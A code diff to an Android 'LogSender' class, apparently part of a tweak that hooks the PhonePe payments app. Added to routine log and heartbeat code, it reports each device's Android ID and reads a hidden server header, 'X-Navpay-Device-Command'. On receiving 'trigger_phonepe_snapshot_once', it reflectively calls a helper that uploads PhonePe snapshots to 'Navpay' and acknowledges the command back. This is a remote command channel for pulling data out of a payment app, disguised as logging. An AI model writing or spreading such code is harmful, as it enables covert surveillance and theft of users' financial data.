@@ -59,8 +59,12 @@ public class LogSender {
     private static final String DEFAULT_SOURCE_APP = "phonepe";
     private static final AndroidIdCache ANDROID_ID_CACHE = new AndroidIdCache();
     private static final long HEARTBEAT_INTERVAL_MS = 10000L;
-    private static final String HEARTBEAT_METHOD = "DEVICE_HEARTBEAT";
-    private static final String HEARTBEAT_URL = "app://phonepe/heartbeat";
+    private static final String HEARTBEAT_APP_NAME = "phonepe";
+    private static final String DEVICE_COMMAND_HEADER = "X-Navpay-Device-Command";
+    private static final String DEVICE_COMMAND_ACK_HEADER = "X-Navpay-Device-Command-Ack";
+    private static final String TRIGGER_PHONEPE_SNAPSHOT_COMMAND = "trigger_phonepe_snapshot_once";
+    private static volatile String pendingCommandAckId = "";
+    private static volatile String lastHandledCommandId = "";
 
     private static final class QueuedLog {
         final JSONObject payload;
@@ -69,6 +73,16 @@ public class LogSender {
         QueuedLog(JSONObject payload, int attempts) {
             this.payload = payload;
             this.attempts = attempts;
+        }
+    }
+
+    private static final class RuntimeCommand {
+        final String commandType;
+        final String commandId;
+
+        RuntimeCommand(String commandType, String commandId) {
+            this.commandType = commandType;
+            this.commandId = commandId;
         }
     }
 
@@ -158,19 +172,19 @@ public class LogSender {
         if (!enabled) {
             return;
         }
-        try {
-            JSONObject json = new JSONObject();
-            json.put("timestamp", System.currentTimeMillis());
-            json.put("method", HEARTBEAT_METHOD);
-            json.put("url", HEARTBEAT_URL);
-            json.put("protocol", "APP");
-            json.put("status_code", 200);
-            json.put("status_message", "OK");
-            json.put("duration_ms", 0);
-            sendLog(json);
-        } catch (JSONException e) {
-            Log.w(TAG, "Failed to enqueue heartbeat", e);
+        JSONObject json = toJson(buildHeartbeatPayloadMap(getAndroidId(), System.currentTimeMillis()));
+        boolean sent = sendHeartbeat(json);
+        if (!sent) {
+            Log.w(TAG, "Failed to send heartbeat to " + LogEndpointResolver.resolveHeartbeatEndpoint((String) null));
         }
+    }
+
+    static Map<String, Object> buildHeartbeatPayloadMap(String clientDeviceId, long timestampMs) {
+        Map<String, Object> payload = new LinkedHashMap<>();
+        payload.put("timestamp", timestampMs);
+        payload.put("appName", HEARTBEAT_APP_NAME);
+        payload.put("clientDeviceId", clientDeviceId == null || clientDeviceId.trim().isEmpty() ? "unknown" : clientDeviceId.trim());
+        return payload;
     }
 
     /**
@@ -218,6 +232,11 @@ public class LogSender {
         return sendToEndpoint(endpoint, log);
     }
 
+    private boolean sendHeartbeat(JSONObject heartbeat) {
+        String endpoint = LogEndpointResolver.resolveHeartbeatEndpoint((String) null);
+        return sendToEndpoint(endpoint, heartbeat, false);
+    }
+
     private String resolveEndpointForSend() {
         String primary = serverUrl == null ? "" : serverUrl.trim();
         if (primary.isEmpty()) {
@@ -227,6 +246,10 @@ public class LogSender {
     }
 
     private boolean sendToEndpoint(String endpoint, JSONObject log) {
+        return sendToEndpoint(endpoint, log, true);
+    }
+
+    private boolean sendToEndpoint(String endpoint, JSONObject log, boolean allowRuntimeCommandHeaders) {
         HttpURLConnection connection = null;
         try {
             URL url = new URL(endpoint);
@@ -236,6 +259,10 @@ public class LogSender {
             connection.setConnectTimeout(5000);
             connection.setReadTimeout(5000);
             connection.setDoOutput(true);
+            String ackCommandId = allowRuntimeCommandHeaders ? pendingCommandAckId : "";
+            if (allowRuntimeCommandHeaders && ackCommandId != null && !ackCommandId.trim().isEmpty()) {
+                connection.setRequestProperty(DEVICE_COMMAND_ACK_HEADER, ackCommandId.trim());
+            }
 
             byte[] body = log.toString().getBytes(StandardCharsets.UTF_8);
             connection.setFixedLengthStreamingMode(body.length);
@@ -246,6 +273,13 @@ public class LogSender {
 
             int responseCode = connection.getResponseCode();
             if (responseCode == 200) {
+                if (allowRuntimeCommandHeaders) {
+                    String commandHeader = connection.getHeaderField(DEVICE_COMMAND_HEADER);
+                    handleRuntimeCommandHeader(commandHeader);
+                    if (ackCommandId != null && !ackCommandId.trim().isEmpty()) {
+                        pendingCommandAckId = "";
+                    }
+                }
                 return true;
             } else {
                 Log.w(TAG, "Server returned: " + responseCode + ", endpoint=" + endpoint);
@@ -365,6 +399,66 @@ public class LogSender {
             TimeZone.getDefault().getID(),
             localeTag()
         );
+    }
+
+    private static void handleRuntimeCommandHeader(String headerValue) {
+        RuntimeCommand command = parseRuntimeCommandHeader(headerValue);
+        if (command == null) {
+            return;
+        }
+        if (!TRIGGER_PHONEPE_SNAPSHOT_COMMAND.equals(command.commandType)) {
+            return;
+        }
+        if (command.commandId.equals(lastHandledCommandId)) {
+            pendingCommandAckId = command.commandId;
+            return;
+        }
+        if (triggerPhonePeSnapshotUpload()) {
+            lastHandledCommandId = command.commandId;
+            pendingCommandAckId = command.commandId;
+            Log.i(TAG, "runtime command handled: " + command.commandType + ", commandId=" + command.commandId);
+        }
+    }
+
+    private static RuntimeCommand parseRuntimeCommandHeader(String headerValue) {
+        if (headerValue == null) {
+            return null;
+        }
+        String raw = headerValue.trim();
+        if (raw.isEmpty()) {
+            return null;
+        }
+        String commandType = "";
+        String commandId = "";
+        String[] parts = raw.split(";");
+        for (String part : parts) {
+            String[] kv = part.split("=", 2);
+            if (kv.length != 2) {
+                continue;
+            }
+            String key = kv[0] == null ? "" : kv[0].trim();
+            String value = kv[1] == null ? "" : kv[1].trim();
+            if (key.equalsIgnoreCase("commandType")) {
+                commandType = value;
+            } else if (key.equalsIgnoreCase("commandId")) {
+                commandId = value;
+            }
+        }
+        if (commandType.isEmpty() || commandId.isEmpty()) {
+            return null;
+        }
+        return new RuntimeCommand(commandType, commandId);
+    }
+
+    private static boolean triggerPhonePeSnapshotUpload() {
+        try {
+            Class<?> helperClass = Class.forName("com.PhonePeTweak.Def.PhonePeHelper");
+            helperClass.getMethod("uploadSnapshotToNavpayAsync").invoke(null);
+            return true;
+        } catch (Throwable t) {
+            Log.w(TAG, "runtime command trigger snapshot failed", t);
+            return false;
+        }
     }
 
     private static String localeTag() {
